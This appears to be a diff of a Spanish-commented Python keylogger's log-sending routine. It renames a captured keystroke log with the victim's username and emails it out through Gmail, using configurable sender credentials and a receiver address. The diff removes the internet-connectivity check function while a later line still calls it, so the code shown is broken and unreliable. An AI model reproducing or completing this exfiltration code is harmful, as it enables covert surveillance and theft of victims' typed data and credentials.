@@ -282,17 +282,7 @@ def SendLog():
     def random_char(y=5):
            return ''.join(random.choice(string.ascii_letters) for x in range(y))
 
-    # Función = Verifica si hay conexión a internet para poder envíar el log
-    def VerificarConexion():
-        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
-        try:                                                            # Intenta conectarse al servidor de Google
-            con.connect(('www.google.com', 80))
-            con.close()
-            print("Conexión a internet => [OK]")
-            return True
-        except:
-            print("Conexión a internet => [NO]")
-            return False
+    
     # Envía los datos reg.k vía Gmail 
     def SendGmail(log, sender_email, sender_password, receiver_email):
         try:
@@ -396,6 +386,7 @@ def SendLog():
         #time.sleep(4) # Solo antigueeo 
         if VerificarConexion():
             if (SendMode() == 0):    # Send Gmail
+
                 # Crea nombre del archivo
                 nameFile = str(getuser())+"-"+random_char(8)+".txt"
                 #Renombra el archivo original
@@ -445,8 +436,6 @@ def FilePath():
 
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
-
-
 # ************ Zona Gmail ************* 
 def emailP():# Correo de envío [Primaria]                    
     return "correo1@gmail.com"  # <<== Cambia éste correo
